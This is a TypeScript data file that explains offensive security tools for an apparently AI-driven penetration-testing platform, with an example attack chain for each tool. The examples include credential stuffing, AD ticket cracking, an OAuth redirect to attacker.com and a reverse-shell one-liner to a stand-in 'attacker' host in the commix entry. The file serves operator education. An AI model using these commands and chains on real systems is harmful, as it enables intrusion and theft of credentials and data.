// Tool knowledge map. One entry per tool the platform exposes.
//
// Each entry has four fields:
//   - what      — one-paragraph "what is this thing?"
//   - why       — when GENESIS reaches for it and what makes it valuable
//   - attack    — a concrete example attack scenario, end-to-end
//   - analogy   — a non-technical metaphor an operator can describe to
//                 someone who has never written security code in their life
//
// Tools without an entry here fall back to the MCP server's `description`
// in the dialog. New tools should get an entry as soon as they ship.

export interface ToolKnowledge {
  what: string;
  why: string;
  attack: string;
  analogy: string;
}

export const TOOL_KNOWLEDGE: Record<string, ToolKnowledge> = {
  // ── Reconnaissance ──────────────────────────────────────────────────────
  nmap: {
    what: 'Nmap (Network Mapper) is the canonical TCP/UDP port scanner. It probes a host on every requested port, fingerprints the service running there, and reports back banners, OS guesses, and TLS metadata.',
    why: 'Always step one. Before you can attack a service, you have to know it exists and what it claims to be. GENESIS feeds nmap output into every downstream agent so they know which ports to focus on.',
    attack: 'Target 10.10.0.11. nmap -sV reports port 80 (Apache 2.4.25), port 22 (OpenSSH 7.4), port 3306 (MySQL 5.7). The exploit agent now knows: try webapp probes on 80, brute-force on 22, and check whether 3306 is exposed to the internet (it shouldn\'t be).',
    analogy: 'Walking around the outside of a building writing down every door, window, and vent — what each looks like, what brand of lock, whether it\'s open. Before you pick a lock, you need to know which doors exist.',
  },
  masscan: {
    what: 'Masscan is a stateless port scanner that can sweep the entire IPv4 address space in minutes. Trade-off: it is fast but less accurate than nmap on individual ports.',
    why: 'Used when the target is a CIDR or many hosts. Masscan finds the alive ports; nmap then comes in for service detection on just those.',
    attack: 'Sweep 10.10.0.0/24 in 30 seconds → masscan returns 47 open ports across 12 hosts. Hand that list to nmap -sV for accurate service fingerprinting only on those ports, instead of nmap-scanning 65,535 ports × 12 hosts.',
    analogy: 'A drone flyover of a campus that maps every roof skylight and side door in two minutes, vs. a building inspector who takes thirty minutes per building. You use the drone first, then send the inspector to the interesting buildings.',
  },
  amass: {
    what: 'Amass (OWASP) does subdomain enumeration via DNS, certificate transparency, search engines, and 60+ data sources. It also does network mapping — building a graph of which subdomains share infrastructure.',
    why: 'A lot of attack surface lives on subdomains nobody documented (dev, staging, admin, jenkins, jira). Amass surfaces them.',
    attack: 'Target example.com. amass enum -d example.com finds api-v2-staging.example.com, internal-jenkins.example.com, and a forgotten admin.example.com — all of which were skipped by the public DNS but left in CT logs. Each is a fresh attack surface.',
    analogy: 'You\'re assessing a company\'s main office at 1 Main St. Amass discovers they also rent a basement at 1B Main St where they keep the test servers, and an unmarked annex behind the building where IT keeps the prototypes. You wouldn\'t have known to look.',
  },
  subfinder: {
    what: 'Subfinder is a faster, passive-only subdomain finder. Pulls from the same kinds of public sources as amass but doesn\'t do active DNS brute-force.',
    why: 'Lighter and quieter than amass. Used when the target host\'s defenders are watching DNS queries.',
    attack: 'subfinder -d example.com → finds 47 subdomains in 8 seconds, all from public records, with zero queries to the target\'s authoritative DNS server.',
    analogy: 'Looking up a company\'s employees on LinkedIn and Crunchbase instead of calling the receptionist. Same answers, no doorbell rung.',
  },
  dnsrecon: {
    what: 'DNS reconnaissance: zone transfer attempts, brute-forced subdomains, reverse-PTR sweeps, NS / MX / TXT enumeration.',
    why: 'When DNS is misconfigured (zone transfer allowed to anyone, DNSSEC zone-walk enabled), it leaks every record in seconds.',
    attack: 'dnsrecon -t axfr -d example.com → the target\'s DNS server allows AXFR. The agent recovers the entire zone file: every subdomain, every internal IP, every CNAME. Game-over for stealth.',
    analogy: 'Asking the post office for a list of every address that receives mail at this company. Sometimes they say yes, and sometimes they shouldn\'t.',
  },
  harvester: {
    what: 'theHarvester gathers email addresses, employee names, hostnames, and ports from public search engines, Have-I-Been-Pwned, GitHub, Shodan, and 30+ other sources.',
    why: 'Phishing prep, credential-stuffing target lists, and finding leaked-secret candidates in commit history.',
    attack: 'theHarvester -d example.com → finds 240 employee emails on LinkedIn + 3 GitHub repos with @example.com committers. The agent feeds those emails to a credential-stuffing list against the company\'s OAuth login.',
    analogy: 'Reading every business card someone has dropped at a conference. None of it is a secret on its own — but together it\'s a map of the company.',
  },
  httpx: {
    what: 'HTTPX is a fast HTTP probe — given a list of hosts/ports, it sends a request and reports status, title, length, server header, and detected technology.',
    why: 'Triages a host list down to "which of these are actually live web apps?" — usually run after masscan or amass.',
    attack: 'Feed it 200 hosts from amass; httpx returns 47 live HTTP(S) endpoints with their status code and tech stack. The agent now picks the WordPress one for wpscan and the Express one for prototype-pollution probes.',
    analogy: 'Going through 200 storefront addresses and noting "this one is open today, this one is shuttered, this one is a coffee shop, this one says under construction." Saves you from knocking on doors that don\'t answer.',
  },

  // ── Web scanning ────────────────────────────────────────────────────────
  nikto: {
    what: 'Nikto is the classic web-server vulnerability scanner. It checks for outdated software, dangerous default files (phpinfo.php, /admin), and 6700+ known issues.',
    why: 'Cheap signal on default-config disasters: phpinfo left on, server-status exposed, default credentials, .htaccess misconfigurations.',
    attack: 'nikto -h http://10.10.0.11 → finds /phpinfo.php (discloses PHP version, modules, and session paths), /server-status (disclosing every active request), and /admin/ accessible without auth.',
    analogy: 'Walking through a building and rattling every door labelled "STAFF ONLY" to see which ones aren\'t actually locked. Most are. The few that aren\'t are a problem.',
  },
  nuclei: {
    what: 'Nuclei is a template-driven scanner. Instead of hard-coded checks, it runs YAML templates — there are now 6,000+ for known CVEs, default credentials, exposed configs, and bug-bounty patterns.',
    why: 'Best ratio of "things checked per second" of any tool. The template library is curated by the bug-bounty community and updates daily.',
    attack: 'nuclei -t cves/2023/ -u http://target → tests for every 2023 CVE template. Finds CVE-2023-46805 (Ivanti VPN auth bypass) on a forgotten internal Ivanti instance. Two HTTP requests, three minutes.',
    analogy: 'A locksmith with a giant ring of master keys, trying each one against the door. Most don\'t fit. The one that does, does.',
  },
  whatweb: {
    what: 'WhatWeb fingerprints web applications — it identifies WordPress version, Drupal modules, JavaScript frameworks, CMS plugins, server-side language, and ~1,800 other technologies.',
    why: 'Tells you what kind of target you\'re dealing with. WordPress 5.7? Run wpscan. Magento? Different probe set. Custom React + Node? Stock scanners are useless and you\'re writing custom forge_runner scripts.',
    attack: 'whatweb http://target → "WordPress 5.7.2, jQuery 3.6.0, Yoast SEO 14.8, Cloudflare". The agent now knows: WordPress 5.7 has CVE-2021-29447 (XXE in Media Library). Hand off to wpscan + nuclei wp-* templates.',
    analogy: 'Knowing the model and year of a car before you try to break in. A 1995 Civic has different weak points than a 2024 Tesla, and you\'d use different tools.',
  },
  wafw00f: {
    what: 'wafw00f detects which Web Application Firewall (Cloudflare, Akamai, AWS WAF, Imperva, etc.) sits in front of the target by sending probe payloads and matching block-page fingerprints.',
    why: 'Knowing the WAF tells you what bypasses to try. Cloudflare\'s SQLi rules differ from AWS WAF\'s, and bypasses are public knowledge per vendor.',
    attack: 'wafw00f http://target → "Cloudflare detected". The agent shifts to Cloudflare-specific bypasses: case mutation, comment-injection (/* */), and HTTP/2 desync.',
    analogy: 'Before forging a passport, you check whether the border guard is using the old book or the new chip-readers. The technique is different for each.',
  },
  gobuster: {
    what: 'Gobuster brute-forces directory and filename paths against a web server using a wordlist.',
    why: 'Web apps almost always have hidden paths the developer forgot to remove: /backup/, /.git/, /admin/, /api/v1/internal/. Gobuster finds them.',
    attack: 'gobuster dir -u http://target -w common.txt → finds /backup/, /.git/HEAD, /api/internal/, /old/. The .git/HEAD lets the agent dump the entire source repository (artifact_pull). /api/internal/ is unauthenticated.',
    analogy: 'Trying every doorknob on a long hallway when the building map says "OFFICES 100-200 only" — but actually rooms 250-300 exist behind unmarked doors.',
  },
  feroxbuster: {
    what: 'Feroxbuster is a recursive directory brute-forcer in Rust. Faster than gobuster and recursive — when it finds /admin/ it then brute-forces inside /admin/.',
    why: 'Better at deep-tree discovery (/api/v1/users/admin/profile/edit/) than single-level scanners.',
    attack: 'feroxbuster -u http://target → finds /api/, recurses into /api/v1/, finds /api/v1/users/, recurses into /api/v1/users/<id>/ where <id> is enumerable.',
    analogy: 'A burglar checking not just every door on the ground floor, but stepping inside each open one and checking every door inside that, recursively.',
  },
  ffuf: {
    what: 'ffuf (Fuzz Faster U Fool) is a fast HTTP fuzzer. Given a wordlist and a marker (FUZZ), it replaces FUZZ in the request with each word in parallel and reports differences.',
    why: 'Finer-grained than gobuster: fuzz query parameters, header values, JSON keys, subdomain prefixes — anywhere that takes input.',
    attack: 'ffuf -u http://target/?FUZZ=test -w params.txt → finds 14 hidden GET parameters (debug=1, admin=true, redirect=, env=) the developer forgot were live. debug=1 returns a stack trace.',
    analogy: 'Asking the same waiter the same question worded 10,000 different ways and watching for the one phrasing that gets a different answer.',
  },
  wpscan: {
    what: 'WPScan is a WordPress-specific scanner that enumerates plugins, themes, users, and vulnerable versions against the WPVulnDB database.',
    why: '~43% of public web is WordPress. Plugins are where most CVEs live. WPScan triages them in seconds.',
    attack: 'wpscan --url http://target/wp/ -e ap → enumerates installed plugins, finds Contact Form 7 v5.3.1 → matched CVE-2020-35489 (file upload bypass). The agent forges a malicious .phtml upload.',
    analogy: 'A mechanic with a checklist of every recall on every model — you bring in a 2018 sedan, they pull up the four open recalls, fix them in order.',
  },
  xsstrike: {
    what: 'XSStrike is an XSS detection and exploitation tool that uses a payload generator + WAF-bypass mutator + rendering-engine fuzzer.',
    why: 'Stock XSS scanners are crude (single payload, no context). XSStrike adapts its payload to the reflection context — attribute, script, body — and tries 70+ bypass techniques.',
    attack: 'xsstrike -u http://target/search?q=test → finds reflected XSS, identifies it\'s in a JS string context, generates a context-appropriate payload that closes the string and executes alert(document.cookie).',
    analogy: 'A locksmith who doesn\'t just have one lockpick — they look at the lock first, identify which type it is, and pick the matching tool. Stock scanners try every key in the same order regardless of the lock.',
  },
  sqlmap: {
    what: 'sqlmap is the canonical SQL injection tool: it detects, enumerates, and exploits SQLi across MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and 12 other DBMS — including blind, time-based, UNION-based, and stacked-query variants.',
    why: 'Once you know there\'s a SQLi, sqlmap turns it into a database dump or a shell with no manual work.',
    attack: 'sqlmap -u "http://target/login.php?user=test" → detects time-based blind on user param. --dump-all → extracts the entire users table including the admin password hash. --os-shell → drops a webshell via INTO OUTFILE.',
    analogy: 'A thief who finds a crack in a wall, then has a robot that automatically widens it into a doorway, walks inside, and steals the safe.',
  },
  commix: {
    what: 'Commix is a command-injection scanner — same idea as sqlmap but for OS-level command injection (parameters that flow into a shell exec call).',
    why: 'A different injection class: shell metacharacters (; | & $() `` ) that often bypass SQLi-focused WAFs entirely.',
    attack: 'commix --url "http://target/ping?host=test" → finds command injection. --os-shell → spawns a reverse shell via ; bash -i >& /dev/tcp/attacker/4444 0>&1.',
    analogy: 'sqlmap picks the lock on the database vault. commix finds an unrelated service door whose handle, when wiggled, also opens the back exit to the building.',
  },
  arjun: {
    what: 'Arjun is a hidden HTTP parameter discovery tool. It guesses common parameter names (debug, admin, env, redirect_to, etc.) and finds ones the server actually responds to.',
    why: 'Many auth bypasses and IDORs hide behind a parameter that\'s not in the documented API but the server still honours.',
    attack: 'arjun -u http://target/profile → finds hidden user_id and is_admin parameters. The agent now has a way to switch which user\'s profile is rendered, AND a way to flip an admin flag.',
    analogy: 'Yelling random words at a magic door: "FRIEND? OPEN? PASSWORD? BANANA?" — most do nothing, but one of them slides the door open a little. You then go through it.',
  },
  curl_probe: {
    what: 'A thin wrapper around curl that lets the agent send a single HTTP request with arbitrary method, headers, and body, and inspect the response.',
    why: 'When the agent has a precise hypothesis ("this endpoint returns 500 on a malformed Content-Type"), it doesn\'t want a scanner — it wants ONE request with full control.',
    attack: 'curl_probe -X PUT http://target/upload -H "Content-Type: ../../etc/passwd" → tests path traversal in the Content-Type header (an obscure but real bug class). Server reflects the path → confirmed.',
    analogy: 'Scanners are shotguns; curl_probe is a scalpel. When you need exactly this incision in exactly this spot, you don\'t use a shotgun.',
  },

  // ── SSL / TLS ───────────────────────────────────────────────────────────
  sslscan: {
    what: 'sslscan probes a TLS endpoint for supported protocols (SSLv2/3, TLS 1.0/1.1/1.2/1.3), cipher suites, certificate details, and known-vulnerable configurations (Heartbleed, BEAST, POODLE, etc.).',
    why: 'Tells you what\'s misconfigured at the cipher layer in 5 seconds. A target that still allows TLS 1.0 + RC4 has bigger problems than its login form.',
    attack: 'sslscan target:443 → reports TLS 1.0 enabled, weak ciphers (3DES, RC4), self-signed cert, and CVE-2014-0160 (Heartbleed) flagged. The agent now downgrades to TLS 1.0 and dumps server memory via Heartbleed.',
    analogy: 'Checking what locks a building uses on its main entrance. If they\'re still on a 1990s pin-tumbler, you don\'t even need to pick — you can buy the bypass key on the internet.',
  },
  openssl_check: {
    what: 'A wrapper around openssl s_client that fetches the target\'s certificate, chain, SAN list, and key information. Lighter than sslscan; useful when you need just the cert details.',
    why: 'Subject Alternative Names often leak internal hostnames, DevOps emails, and dev/test infrastructure that DNS hides.',
    attack: 'openssl_check target:443 → cert SAN includes internal-jenkins.example.com, gitlab-staging.example.com, and admin@example.com. The agent now has three new attack-surface targets and a phishing pivot.',
    analogy: 'Reading the visitor log on the wall behind reception. The receptionist won\'t tell you who else is in the building, but the log will.',
  },

  // ── Authentication ─────────────────────────────────────────────────────
  hydra: {
    what: 'Hydra is a parallel password brute-forcer that supports SSH, FTP, RDP, SMB, MySQL, PostgreSQL, HTTP-form, and 50+ other protocols.',
    why: 'Even in 2026, weak / default / reused credentials are still the #1 entry point. Hydra automates the dictionary attack.',
    attack: 'hydra -L users.txt -P rockyou.txt ssh://target → finds admin:admin123 in 4 minutes. The agent now has shell as admin.',
    analogy: 'Trying every key on a giant ring against a single lock, very fast. Most don\'t fit. The point is statistics: if you have a million keys and the lock is one of the common ones, one of them will fit.',
  },
  john: {
    what: 'John the Ripper is an offline password cracker — given a hash (MD5, NTLM, bcrypt, SHA-256, PBKDF2, etc.), it tries dictionary + rules + brute-force to recover the plaintext.',
    why: 'Once you\'ve dumped a database\'s users table or an LSASS memory dump, john converts hashes back to passwords for lateral movement and credential stuffing.',
    attack: 'john --wordlist=rockyou.txt hashes.txt → cracks 47 of 200 user password hashes in 12 minutes. Top result: ceo@example.com → "Password123!". Lateral movement begins.',
    analogy: 'You\'ve got a stack of locked diaries. John is a parallel team that tries every common combination on every diary at once, and prints the ones that opened.',
  },

  // ── Windows / Active Directory ─────────────────────────────────────────
  enum4linux: {
    what: 'enum4linux-ng dumps SMB/NetBIOS information from a Windows host: shares, users, groups, password policy, OS version, and RID enumeration.',
    why: 'Windows SMB has historically leaked enumeration data via null sessions. Even modern AD environments expose more than they should.',
    attack: 'enum4linux-ng -A target → returns a full user list (200 names), the password policy ("min length 7, no lockout"), and three open shares including \\\\target\\Backup\\. Hydra now has a username list; the Backup share has a copy of the SAM database.',
    analogy: 'Walking up to a building reception, picking up the company directory off the desk, and walking out. Nobody stopped you because they assumed you were supposed to be there.',
  },
  netexec: {
    what: 'NetExec (formerly CrackMapExec) is the Swiss Army knife of Windows lateral movement: tests SMB / WinRM / SSH / MSSQL / LDAP credentials at scale, runs commands across hosts, dumps SAM/LSA/NTDS, and pivots through trust relationships.',
    why: 'Once you have one credential, netexec finds every host that credential works on — and on those hosts, what you can do with it.',
    attack: 'netexec smb subnet/24 -u admin -p Password123 → finds the credential works on 47 of 80 hosts. On 12 of those, it can execute commands. On 3, it can dump the local SAM. Lateral movement complete.',
    analogy: 'A janitor\'s master key for one building, tested against every door in the city block. Some open, some don\'t. The ones that do tell you which buildings are part of the same chain.',
  },
  impacket: {
    what: 'impacket is a Python suite for Windows protocol manipulation: secretsdump, GetNPUsers, GetUserSPNs, smbclient.py, psexec.py, and 30+ others. Each is a focused tool for one AD attack.',
    why: 'When you need surgical AD attacks: AS-REP roasting, Kerberoasting, DCSync, SMB-relay. impacket scripts ARE those attacks.',
    attack: 'impacket-GetNPUsers -dc-ip target → returns Kerberos AS-REP tickets for users with "DONT_REQUIRE_PREAUTH" set. Hand to john for offline cracking. 4 of 8 users\' passwords cracked in 2 hours.',
    analogy: 'A locksmith\'s precision toolkit — one tool to bump pins, one for impressioning, one for decoding wafer locks. impacket has one for every Windows-auth weakness.',
  },
  kerbrute: {
    what: 'kerbrute does Kerberos username enumeration and password spray against a Domain Controller — it can enumerate valid usernames quickly because the KDC responds differently to existing vs non-existing accounts.',
    why: 'Username enumeration is the prelude to a successful spray. Once you know which 200 usernames are real, you spray "Spring2024!" against just those, very quietly.',
    attack: 'kerbrute userenum -d corp.local users.txt → confirms 200 valid usernames. kerbrute passwordspray -d corp.local users.txt "Welcome2024!" → 4 valid logins.',
    analogy: 'Calling every employee from a directory and saying "is this John from accounting?" — most say no, four say yes. Now you only try the four when you make your real call.',
  },

  // ── Static analysis ────────────────────────────────────────────────────
  semgrep: {
    what: 'Semgrep is a fast static-analysis engine that runs YAML rules against source code. It catches taint-flow patterns (user input → SQL exec, user input → shell exec) the way grep would, but with full AST awareness.',
    why: 'When the agent has pulled source via artifact_pull (.git leak, exposed sourcemap, S3 bucket), semgrep tells it where the injection sinks are without reading 10,000 lines.',
    attack: 'semgrep --config=p/security-audit on a pulled Node.js repo → finds 6 SQL string-concatenation sinks in routes/users.js, including one that reaches an unauthenticated endpoint /api/lookup. The agent forges a POC against it.',
    analogy: 'Reading a building\'s blueprint and circling every electrical outlet that\'s not GFCI-protected. You haven\'t walked the building yet, but you know where the wet-room hazards are.',
  },
  bandit: {
    what: 'bandit is the Python-specific static-analysis tool. Spots common Python security smells: hardcoded passwords, eval() of user input, shell=True in subprocess, weak crypto, pickle of untrusted data.',
    why: 'When the pulled repo is Python, bandit triages high-confidence issues fast. Pairs with semgrep for cross-language coverage.',
    attack: 'bandit -r ./pulled_repo → flags subprocess.call(user_input, shell=True) at app/utils.py:142. The agent traces the call site to a Flask endpoint /import that accepts a filename. Command injection confirmed.',
    analogy: 'A Python-specialist building inspector who knows the local fire-code by heart and can speed-read every blueprint for the four things that always go wrong.',
  },

  // ── AI-Driven (v2.0) ───────────────────────────────────────────────────
  ai_request_forge: {
    what: 'A backend service where the agent writes a full HTTP request (method/url/headers/body) AND a declarative oracle (expected status, body must contain, regex, response time). The platform sends the request, evaluates the oracle deterministically, and accepts the verdict as evidence.',
    why: 'Stock scanners are rule-bound. ai_request_forge lets the agent express ANY HTTP exploit — including ones no scanner author has written — with a precise success predicate. A passing oracle is first-class evidence under the U1 evidence rule.',
    attack: 'Hypothesis: "GET /api/users/1 returns user 1\'s data, /api/users/2 returns user 2\'s — IDOR." The agent forges a request to /api/users/2 with user 1\'s JWT, oracle: body_must_contain="user 2\'s email". Oracle PASS = confirmed IDOR.',
    analogy: 'Instead of using a pre-printed multiple-choice quiz, you write your own essay question: "if I push exactly THIS button, does this exact sentence appear?" Then the platform pushes the button and tells you yes or no.',
  },
  forge_runner: {
    what: 'A sandboxed Python/Node/Bash executor restricted to the target IP and the OOB-callback domain. The agent writes a script (≤8 KB, ≤180 s wall-time, 256 MB cap) and the platform runs it inside a hardened container.',
    why: 'Some attacks are too stateful for a single HTTP request — multi-step OAuth, session-fixation loops, AWS SigV4 signing, concurrent races. A 30-line Python script does what a stock scanner can\'t.',
    attack: 'Multi-step PHPSESSID extraction: GET /login → regex out the CSRF token → POST /login with creds + token → assert PHPSESSID present in response. 1670 chars of Python, oracle "body_must_contain: PHPSESSID, exit_code: 0", PASS. Authenticated session captured.',
    analogy: 'Instead of using a pre-built lockpick set, you sit down at a workbench and machine your own lockpick to the exact shape of this exact lock. The bench is locked in a steel cage so you can\'t hurt anything outside.',
  },
  artifact_hunter: {
    what: 'Hunts for exposed source/binaries/configs on a target: .git/HEAD, webpack sourcemaps, /actuator/heapdump, /swagger.json, anonymous SMB/FTP, S3 bucket listings, Docker registry catalogs.',
    why: 'Half of all real-world breaches start with leaked source. If the agent can pull source, it can read the auth logic instead of guessing.',
    attack: 'artifact_hunter http://target → finds /.git/HEAD readable. The agent then artifact_pulls the full repo, finds AWS keys hardcoded in config/secrets.yml, takes over the AWS account.',
    analogy: 'Walking around the back of a hotel and looking for the dumpster where housekeeping throws old keycards. Sometimes there\'s nothing. Sometimes there\'s a working master.',
  },
  artifact_pull: {
    what: 'Downloads a hunted artifact (a .git directory, a .jar, a heap dump, an APK) into the session\'s artifact volume so other tools (binary_decompile, code_read, semgrep) can analyse it.',
    why: 'You can\'t decompile a binary you haven\'t pulled. This is the hand-off step between "I see a leaked file" and "I can read it."',
    attack: 'artifact_hunter found /.git on the target. artifact_pull --url http://target/.git → reconstructs the .git folder via git-dumper, gives the agent every commit, every secret, every developer name.',
    analogy: 'You found the unlocked dumpster. artifact_pull is bringing the bag back to your van.',
  },
  cve_patch_pull: {
    what: 'Given a detected package + version that maps to a CVE, fetches the upstream patch commit (the actual code change that fixed the bug).',
    why: 'A CVE description tells you "there\'s a bug." The patch tells you exactly which line, which input, and which sink. Reading the patch shows you the pre-patch sink to attack.',
    attack: 'whatweb finds Tomcat 6.0.18; CVE-2017-12617 maps to it. cve_patch_pull → retrieves the commit that fixed PUT-with-newline file upload. The agent now knows the precise filename pattern Tomcat\'s pre-patch parser missed and crafts the malicious PUT.',
    analogy: 'Instead of guessing where the patch sealed the leak in the dam, you read the engineer\'s repair report — which says "drilled a 3 cm crack at coordinate X". Now you know exactly where to push.',
  },
  binary_decompile: {
    what: 'Ghidra-headless pseudo-C decompilation of a pulled binary (ELF, JAR, APK, .so, .dll, heapdump). Returns the top-N functions and string cross-references.',
    why: 'When the agent has a binary, decompile is how it reads the auth logic. Hardcoded keys, weak comparisons, broken token checks all surface in pseudo-C.',
    attack: 'artifact_pull yielded a JAR from /actuator/heapdump. binary_decompile → finds checkPassword() does a string comparison instead of timing-safe compare; another function has hardcoded API key "sk-prod-7a4b...". The agent uses the API key directly.',
    analogy: 'You\'ve got a sealed envelope (the binary). Ghidra is an X-ray machine that reads the letter inside without opening it.',
  },
  code_read: {
    what: 'A grep-aware reader for pulled source trees. Search by symbol, file pattern, or regex; pull the surrounding context.',
    why: 'When semgrep flags a sink at app.py:142, code_read fetches the function around that line so the agent knows the call graph and parameter shape.',
    attack: 'semgrep flagged subprocess.call(user_input, shell=True). code_read app/utils.py:130-160 → reveals the call comes from /import endpoint, expects a filename, and the user_input is unsanitised. The agent crafts the OS-command-injection payload.',
    analogy: 'You\'ve circled a section in the blueprint. code_read is zooming in on that section to see the wiring around it.',
  },
  render_and_see: {
    what: 'Headless Chromium snapshot — returns screenshot + DOM + console + network requests. The screenshot is attached to the agent\'s next turn as a vision image so it can visually reason about the page.',
    why: 'Some targets hide their structure behind JavaScript. A page that returns "loading…" to curl might render a full admin dashboard in a real browser. Render_and_see lets the agent see what a human sees.',
    attack: 'curl returns a SPA shell. render_and_see http://target/admin → the screenshot shows a fully-rendered admin panel with a "Run Query" button. The agent reads the DOM, finds the query endpoint, and tests for SQLi.',
    analogy: 'Reading the menu in Braille (curl) versus actually walking into the restaurant and looking around (render_and_see). Sometimes the menu is the same. Sometimes there\'s a chalkboard inside that the menu doesn\'t mention.',
  },

  // ── Tier-3 frontier ────────────────────────────────────────────────────
  browser_session: {
    what: 'Stateful multi-step Chromium driven by Playwright. The agent calls action=start, then sequentially goto/click/fill/wait — each step\'s screenshot is attached to the next vision turn. Cookies, localStorage, sessionStorage all persist.',
    why: 'OAuth flows, captcha-gated UIs, multi-page admin wizards, anything that needs "log in then navigate then click" — render_and_see is one-shot, browser_session is a real browser session.',
    attack: 'Multi-step OAuth abuse: browser_session.start → goto /login → fill creds → click submit → goto /oauth/authorize?redirect_uri=//attacker → click Allow → screenshot shows redirect to attacker.com with the code. OAuth-redirect-bypass confirmed.',
    analogy: 'curl is one snapshot through a window. render_and_see is a single photo of the whole room. browser_session is a video of you walking through the building, opening doors, flipping switches.',
  },
  fuzz_binary: {
    what: 'AFL++ coverage-guided fuzz against a pulled user-mode binary. Seed with base64 corpus inputs matched to the format the binary expects; AFL++ mutates them, watches code coverage, and saves any input that crashes the binary.',
    why: 'Crashes from coverage-guided fuzzing are usually exploitable bugs (memory corruption, parser confusion). This is how zero-days are found in libraries.',
    attack: 'binary_decompile flagged a custom XML parser in a pulled JAR. fuzz_binary --grammar xml --seed corpus_xml --duration 600s → finds a crash on input <a><![CDATA[…]]></a> with a malformed tag. The agent gets an exploit primitive.',
    analogy: 'A factory that bombards a product with random-but-targeted inputs and stockpiles every one that breaks the machine. The crash is a defect; the defect is an attacker\'s leverage.',
  },
  symbolic_exec: {
    what: 'angr-backed reachability proofs. Given a decompiled sink address, ask "is there an input that reaches this address?" — angr explores the binary symbolically and returns either a base64 stdin/argv that reaches it, or "unreachable."',
    why: 'Pairs with binary_decompile: decompile finds the suspect sink, symbolic_exec proves whether it\'s reachable. If it\'s unreachable, you\'ve saved hours not crafting a fuzzer for a dead path.',
    attack: 'binary_decompile found a strcpy() with no length check at function 0x401234. symbolic_exec --target 0x401234 → returns an argv vector that triggers the strcpy. Hand to fuzz_binary or a manual exploit.',
    analogy: 'A maze with one room marked "danger." Symbolic execution is a robot that knows the maze and tells you "yes, here are the steps to walk into that room" or "no, that room is walled off from the entrance."',
  },

  // ── v3.0 / Tier-5 ──────────────────────────────────────────────────────
  graph_query: {
    what: 'A read-only Cypher runner against the platform\'s Neo4j attack-knowledge graph. Labels: Host, Service, Finding, Credential, Token, Privilege, Target. Edges: LISTENS_ON, AFFECTS, CHAINS_INTO, GRANTS, AUTHENTICATES_TO.',
    why: 'Cross-session memory. Every prior engagement against the same target shows up here. The agent can ask "shortest path from any Credential to any Privilege" and get the historic answer.',
    attack: 'graph_query "MATCH p = shortestPath((c:Credential)-[*..6]-(pr:Privilege {name: \'DomainAdmin\'})) RETURN p" → returns a 4-step chain from a credential leaked in last week\'s session to DomainAdmin. The agent picks up where the previous session left off.',
    analogy: 'Most security tools are like Etch-a-Sketches — you finish, the screen wipes, next session starts blank. graph_query is a cumulative case file: every clue from every prior visit is filed away and queryable.',
  },
  instrument_trace: {
    what: 'Frida or DynamoRIO live binary instrumentation. The agent supplies a pulled binary path + a hook script (Frida JS or DynamoRIO drrun args), the tool spawns the binary in a hardened container and returns runtime events: function entries, register dumps, syscalls, basic-block coverage.',
    why: 'Static analysis misses runtime-dependent bugs (timing, JIT, async data flow). Instrument is the lab microscope: you watch the binary run, with hooks at specific addresses.',
    attack: 'binary_decompile found a suspect strcmp() in a checkLicense() function. instrument_trace mode=frida hook=Interceptor.attach(0x4012ab, { onEnter(args){ send(Memory.readUtf8String(args[0])) } }) → on each call, the function dumps the expected license string before comparison. The agent now has the valid license without reverse-engineering it.',
    analogy: 'binary_decompile is reading the recipe. symbolic_exec is calculating which ingredients lead to the cake. instrument is putting the dish under a thermal camera while it bakes and watching every reaction in real time.',
  },
  fuzz_differential: {
    what: 'Differential fuzzing — give it two binaries + a seed corpus, it runs each input through both and reports seeds where stdout / exit_code diverge.',
    why: 'Two implementations of the same spec (TLS, JSON, XML parsers) should agree. They almost never do at the edges. Disagreements are bugs in at least one of them — and often exploitable.',
    attack: 'fuzz_differential binaries=[openssl, boringssl] seeds=clientHello_corpus → 47 inputs where the two TLS implementations disagree. One of them is a confusion bug where openssl accepts a malformed extension that boringssl rejects. The agent crafts a TLS-MITM PoC that confuses servers using openssl behind a boringssl proxy.',
    analogy: 'Two pharmacists fill the same prescription side-by-side. Almost always they pour the same number of pills. Almost never. The differences are where one of them is misreading the recipe — and you want to be filling that prescription.',
  },
  payload_swarm: {
    what: 'Parallel variant runner. The agent supplies a code template with ${VAR} placeholders and a list of variant params; the platform fans them across the 4-replica forge_sandbox pool, evaluates each oracle, and returns variants ranked by oracle verdict + behavioural-novelty score.',
    why: 'Stock scanners try one payload at a time. payload_swarm explores 8-32 variants in parallel along a hypothesis axis (encoding, polyglot, race timing, header confusion). The novelty score surfaces the variant that produced the unique behaviour — that\'s your bug.',
    attack: 'Hypothesis: "the chatbot tool layer concatenates user input into a SQL WHERE clause." payload_swarm template: import requests; print(requests.post("/chat", json={"msg": "${P}"}).text), variants = 16 SQL polyglots (URL-encoded, double-encoded, unicode-overlong, NULL-injected, comment-of-the-week, second-order). One returns a different response shape: novelty_score 1.0. The agent re-shoots that variant in forge_runner with a precise oracle and confirms blind SQLi.',
    analogy: 'Instead of trying one disguise at a time at the bouncer, you bring 16 friends each in a different disguise and walk up at once. 15 get rejected. The one that gets in tells you which disguise the bouncer doesn\'t recognise.',
  },
  crypto_padding_oracle: {
    what: 'Implements the Vaudenay PKCS#7 CBC padding-oracle attack. Given an oracle URL that distinguishes valid-vs-invalid padding (a regex on body, or a status code) and a sample ciphertext (base64, IV-prefixed), it recovers the plaintext byte-by-byte.',
    why: 'A staggering number of legacy cookie systems use AES-CBC with no MAC. If the server reveals "padding error" differently from "decryption ok but content wrong", every cookie\'s plaintext is recoverable in a few thousand requests.',
    attack: 'Target sets a cookie session=BASE64. The agent observes that flipping the last byte yields a 500 ("padding error") while a valid replacement yields a 200. crypto_padding_oracle decrypts the cookie in 3,800 requests; plaintext reads {"user":"alice","admin":false}. The agent then re-encrypts {"admin":true}, replaces the cookie, becomes admin.',
    analogy: 'A safe with a number-pad that beeps differently when the first digit is right vs wrong. You don\'t need the combination; you just need the safe to keep talking.',
  },
  crypto_bleichenbacher: {
    what: 'Bleichenbacher\'s 1998 PKCS#1 v1.5 RSA padding-oracle attack. Given (n, e), an intercepted ciphertext, and an oracle URL that distinguishes valid PKCS#1 padding from invalid, it recovers the original plaintext.',
    why: 'Despite being 25+ years old, this still works against thousands of TLS servers (ROBOT, Return of Bleichenbacher\'s Oracle Threat). Recovers RSA-encrypted session keys.',
    attack: 'Target uses RSA-key-exchange TLS and leaks padding errors. The agent intercepts a TLS pre-master-secret ciphertext, fires crypto_bleichenbacher with the server\'s RSA pubkey + oracle, recovers the pre-master in ~1M queries (quadratic in modulus bits). Decrypts the entire TLS session offline.',
